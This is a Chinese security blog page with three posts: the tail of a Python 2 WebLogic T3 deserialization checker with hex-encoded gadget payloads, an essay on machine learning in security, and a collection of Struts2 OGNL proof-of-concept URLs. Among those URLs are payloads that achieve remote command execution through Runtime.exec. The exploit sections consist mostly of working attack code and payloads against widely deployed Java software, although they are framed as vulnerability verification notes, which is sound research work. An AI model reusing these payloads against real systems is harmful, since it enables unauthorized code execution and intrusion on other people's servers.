class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</div><div class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>,<span class="string">'org.apache.commons.collections.functors.InvokerTransformer'</span>,<span class="string">'\\$Proxy[0-9]+'</span>]</div><div class="line"></div><div class="line">def t3handshake(sock,server_addr):</div><div class="line">    sock.connect(server_addr)</div><div class="line">    sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(1)</div><div class="line">    sock.recv(1024)</div><div class="line">    <span class="built_in">print</span> <span class="string">'handshake successful'</span></div><div class="line"></div><div class="line">def buildT3RequestObject(sock,port):</div><div class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></div><div class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</div><div class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></div><div class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></div><div class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</div><div class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(2)</div><div class="line">    <span class="built_in">print</span> <span class="string">'send request payload successful,recv length:%d'</span>%(len(sock.recv(2048)))</div><div class="line"></div><div class="line"></div><div class="line">def sendEvilObjData(sock,data):</div><div class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></div><div class="line">    payload+=data</div><div class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></div><div class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/2 + 4),payload)</div><div class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</div><div class="line">    res = <span class="string">''</span></div><div class="line">    try:</div><div class="line">        <span class="keyword">while</span> True:</div><div class="line">            res += sock.recv(4096)</div><div class="line">            time.sleep(0.1)</div><div class="line">    except Exception as e:</div><div class="line">        pass</div><div class="line">    <span class="built_in">return</span> res</div><div class="line"></div><div class="line">def checkVul(res,server_addr,index):</div><div class="line">    p=re.findall(VER_SIG[index], res, re.S)</div><div class="line">    <span class="keyword">if</span> len(p)&gt;0:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is vul %s'</span>%(server_addr[0],server_addr[1],VUL[index])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is not vul %s'</span> % (server_addr[0],server_addr[1],VUL[index])</div><div class="line"></div><div class="line"></div><div class="line">def run(dip,dport,index):</div><div class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="comment">##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></div><div class="line">    sock.settimeout(50)</div><div class="line">    server_addr = (dip, dport)</div><div class="line">    t3handshake(sock,server_addr)</div><div class="line">    buildT3RequestObject(sock,dport)</div><div class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</div><div class="line">    checkVul(rs,server_addr,index)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    dip = <span class="string">'10.8.56.17'</span></div><div class="line">    dport = 7001</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(VUL)):</div><div class="line">        run(dip,dport,i)</div></pre></td></tr></table></figure></p>
<p>漏洞验证环境可以用phith0n牛的weblogic环境：<a href="https://github.com/phith0n/vulhub/tree/master/weblogic/weak_password" target="_blank" rel="external">weak_password</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/09/10/Java反序列化漏洞/" data-id="cjca1zrwf000d881b6v0hdbrj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-机器学习再信息安全中的应用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/08/11/机器学习再信息安全中的应用/" class="article-date">
  <time datetime="2017-08-11T08:44:31.000Z" itemprop="datePublished">2017-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前段时间听了一个”机器学习在信息安全中的应用”的讲座，应该是我今年听关于机器学习在信息安全中的应用的最好的一场，研究嘉宾是kkqq大神，后来自己又做了一些思考，在此做一个总结。<br>在和黑客对抗的过程中，面对的威胁有3个不同的认知程度：<br>1.已知的威胁。<br>2.已知的未知的威胁。<br>3.未知的未知的威胁。<br>很多时候，在做产品、做运营和做研究的时，最大的恐惧是面对一个最未知的恐惧；因为只要知道这个情况是已知的，有很多技术手段都是可以解决的。<br>首先我们说一下如何定义和衡量已知和未知。从安全角度来说比较容易：<br>已知的已知就是我如果在做一个产品，我自己每天能看见的，能检测到的；<br>已知的未知就是我自己看不见，也检测不到，但是友商们都有检测；<br>未知的未知确实就是我不知道，除非它发生了，被通过某些机缘巧合的情况下暴露了出来，这个情况下，才会换成我们所谓的已知的未知。<br>做安全的，不管是甲方还是乙方，面临同样的挑战，就是一个事情只要我知道，我所有的分析，所有的IOC，所有的威胁情报都能跟上去，但如果这个事情我不知道，那真是无从下手。<br>其实在每一个层次上面，我们也可以横向定义到我们的产品，我们的运营上面去，我们怎么样去衡量你是不是在这个层次上做得比较好。<br>首先，要解决的是效果问题。这些效果包括我的检出率、召回率、误报率，就是这些不同的指标。但是更重要的是运营的，我怎么去衡量。不管你做任何的系统，你如果一天摔给我1000个报警，那我绝对不可能响应的过来的，所以运营就是事件可响应的数量不能太多。<br>每一个攻击来的时候，如果你不知道它背后是谁，那你这个其实还是没有解决到根本的问题。<br>我们用这个效果运营和知己知彼来衡量你在每个维度上到底能做到什么样的程度。</p>
<h4 id="规则系统"><a href="#规则系统" class="headerlink" title="规则系统"></a>规则系统</h4><p>我只需要写规则，我就能把这个问题解决掉。但是有一个坏处，严重依赖于安全专家，因为你要想把一个安全场景的检测逻辑转化到一个规则系统里面，你是需要人深入了解到清楚每一个环节。<br>规则系统，就是写规则嘛。它的误报率和检出率都是相对比较认可的，误报也是比较可控的，可运营的。我出了一个误报，我可以做到把这个规则删了就可以了，这样误报就没有了，不影响你整个架构。<br>存在的问题就是规则系统是严重依赖于你的专家的知识，天然的就限制了你的规则系统是基于被动响应的模式的，比如说杀毒软件，只有我有一个样本我才能写一套规则，而且要在过程中是严重依赖于分析师的。我们拿杀毒软件举例子，分析师说我需要确定一下这个家族有什么样的特征，为了很快的能做响应，它有很多烦琐的或者是特别重的自动化流程去做。<br>还是相对有一个好处，能很明确的告诉你，这是什么病毒，这个在有时候，尤其是在互联网企业做安全运营的时候是很重要的指标，因为我如果来了一个远控和我来了一个普通的刷流量的恶意软件，这个威胁程度在我们看来是不一样的。</p>
<h4 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h4><p>我有一个固定的数据集合集，我有一个模型套上去，我先做一个模型，然后我有检测结果。严重依赖与我们的安全专家，提供精确的数据标签。我需要不断的再把它的结果打上标签，再去逐步做验证，它其实是一个人工辅助的过程。<br>机器学习和以前的规则系统不大一样，以前的规则系统是安全研究员就能搞定的事情。但是在机器学习的场景下，是需要安全专家和数据科学家共同协作的。<br>其实在机器学习的场景下，你会发现安全专家起到的作用要比数据科学家要重一点，因为它里面有一个特征提取的过程，这个特征提取是很严重的依赖于你的专家先验知识的，这些特征提取是数据科学家解决不了的一个问题。<br>机器学习就是它在固定数据集的时候，效果特别好，输入、输出严格限定的话，效果绝对要比规则系统强很多。<br>数据处理要比你的规则系统要强，因为它是天然的和大数据这套东西都结合起来的。<br>但是第二个就有待商榷，它落地的时候这个误报率，第一步它在训练的时候那个指标特别好看，但是安全每天的形势都是在变的，今天你做的四个九、五个九的模型，明天来了一个新的东西，你会发现他以前没考虑到，有误报。这个误报就不是简单的0.001%的标准，很可能放大到一个你没有做运营的场景。<br>在一个规则系统里面，你如果要做误报，这个响应是相对比较容易的，我就删一条规则嘛，大不了加个强限制的的条件。机器学习的时候，你看这个模型是人一眼看上去理解不了的，需要很精确的、很深入的做关联，才能理解机器学习的模型，就意味着你不能通过一个简单的把一个分支改掉的方式解决问题，得需要把模型重新迭代一遍，迭代模型大家做过的都知道，周期是比较长的了。<br>最后一个是它的威胁分类比较困难。</p>
<h4 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h4><p>它在解决大局观的问题下，要比人的性能要好。那我们给它一个定位，它尝试在解决一个已知的未知的问题，它能比机器学习解决得更好。但是它也在尝试着突破未知的未知，这个可能比较难理解，我们后面也展开说一下。<br>它还是严重的依赖专家，给你提供一个初始的数据集用来做标签，用来做结果验证。但是你会明显感觉到，如果大家在说神经网络的时候，你会发现专家的分量降低了，算法和计算或者是模型的层次会变高了。那就变成一个数据科学家主导的过程，而不是专家主导的过程，专家更多是去辅助验证这个模型。<br>深度学习和机器学习都有同样的问题，但是因为它的更不可控性或者是更不理解性，所以就造成了和机器学习有同样的问题，但是会相对比更严重。</p>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>特定场景的检测，就是固定输入输出，有固定的规则系统。在固定场景的情况下，还是有很大的潜力去发现已知的未知，甚至于去发现一些未知的未知，这些特定场景我们前面也提到了有一些问题，比如说误报的问题、漏报的问题，也是通过一个运营的方式去解决，但是运营的方和我们以前常见的不一样，我们杀毒软件来了误报了以后，我们都是分析师去处理的，但是在机器学习、人工智能这个大框架下，是通过数据密集型的逻辑去解决的。<br>多维度中的一个维度，因为我们前面提到的，机器学习和深度学习最大的问题可能在落地的时候是有误报的问题和时效性的问题，在泛安全的场景下，其实还有很多场景不需要这么强的对误报的容忍度或者是漏报的容忍度那么低的。而且在大的体系下是只依赖于一个东西做某些程度的决策，而不是要求你做百分百的决策。<br>实时对抗性没那么强。这些场景大家都相对比较熟悉了，就是风控，风控包括人脸识别、用户粗向、策略模型，你会发现在某一个子方向上确实没有程度做到一个我们可以直接拿过来做单一维度的对抗手段，但是你把所有的这些东西综合在一起，因为风控讲的是可控，我们如果是搞攻防对抗的，你有一起安全事故很可能被搞了，但是风控在大的场景下，只有一个百分比的用户的损失是可以接受的，我就是相对比较成功的，所以在这种场景应用是很成功的。<br>威胁情报，很多人可能喜欢把威胁情报归到检测里面去，但是我觉得不是，它主要还是解决知己知彼的问题，在知己知彼的场景下，它其实是可以通过人工后期确认的方式，来达到你要的效果。所以在这个场景下它也没有那么高的实时对抗性的误报的要求。<br>最常见的，后台数据处理，批量数据分析包括聚类、分类这些应用，可能每家都有很成功的应用。</p>
<h4 id="未知的未知"><a href="#未知的未知" class="headerlink" title="未知的未知"></a>未知的未知</h4><p>未知的未知我们到底怎么解决，是我们现在相对比较前沿的在人工智能方向上的一个，AlphaGo里面用的那套模型，就是Reinforcement  Learning，里面有一个反馈机制，我觉得人工智能的路还很长，但是这些跬步都是一步步积累下来的，我们虽然看不到人工智能在信息安全或者是其他行业的终局，但是能看到的就是Reinforcement  Learning在下一步的人工智能里面相对迭代效果还不错的。<br>如果要落地的话，你会发现数据的重要性远远大于其他所有方面。<br>没有数据就没有大数据，没有大数据就没有人工智能，也没有机器学习。<br>模型，大家有时候可能觉得模型和算法是一套东西，模型在我们的概念就是一个威胁场景，必须要定义好你要解决什么样的问题，在这种情况下用算法适配，而不是反过来。所以我们自己的概念是说数据大于模型，模型大于算法。我们自己切身的体验是，你如果按照这个走的话，你的落地的效果肯定会多一些。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/08/11/机器学习再信息安全中的应用/" data-id="cjca1zrwv000v881bcgcike2b" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-解密Struts2-POC" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/07/18/解密Struts2-POC/" class="article-date">
  <time datetime="2017-07-18T07:44:42.000Z" itemprop="datePublished">2017-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>struts的威力大家都知道，这里找几个有代表性的POC讲一下，做一个记录。</p>
<p>#####回显POC<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman.getWriter().println(%22[/ok]%22)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))</div></pre></td></tr></table></figure></p>
<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))%2b'</span></div></pre></td></tr></table></figure></p>
<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))&amp;z[(foo)(<span class="string">'meh'</span>)]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22),%23response.close()&#125;</span></div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=<span class="literal">true</span>,%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23resp.println(%22[ok]%22),%23resp.close()%7D.action</div></pre></td></tr></table></figure></p>
<p>poc7<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()&#125;</span></div></pre></td></tr></table></figure></p>
<p>@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22)其实是静态调用ServletActionContext; ServletActionContext能够拿到真正的HttpServletRequest、HttpServletResponse、ServletContext。拿到一个HttpServletResponse响应对象后就可以调用getWriter方法(返回的是PrintWriter)让Servlet容器上输出[/ok]了，而其他的POC也都做了同样的事：拿到HttpServletResponse，然后输出[/ok]。其中的allowStaticMethodAccess在Struts2里面默认是false，也就是默认不允许静态方法调用。</p>
<p>#####精确判断是否存在（延迟判断）:<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(d)((<span class="string">'@java.lang.Thread@sleep(5000)'</span>)(d))</div></pre></td></tr></table></figure></p>
<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000))%2b'</span></div></pre></td></tr></table></figure></p>
<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(<span class="literal">false</span>)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span></div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span>.action</div></pre></td></tr></table></figure></p>
<p>之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。</p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>关于回显：webStr\75new\40byte[100] 修改为合适的长度。<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(h)((<span class="string">'\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%22))'</span>)(d))&amp;(i)((<span class="string">'\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())'</span>)(d))&amp;(i01)((<span class="string">'\43webStr\75new\40byte[100]'</span>)(d))&amp;(i1)((<span class="string">'\43webRootzproreader.readFully(\43webStr)'</span>)(d))&amp;(i111)(<span class="string">'\43webStr12\75new\40java.lang.String(\43webStr)'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i95)((<span class="string">'\43xman.getWriter().println(\43webStr12)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))%2b'</span>&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/freecms/login_login.do?user.loginname=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))&amp;z[(user.loginname)(<span class="string">'meh'</span>)]=<span class="literal">true</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span 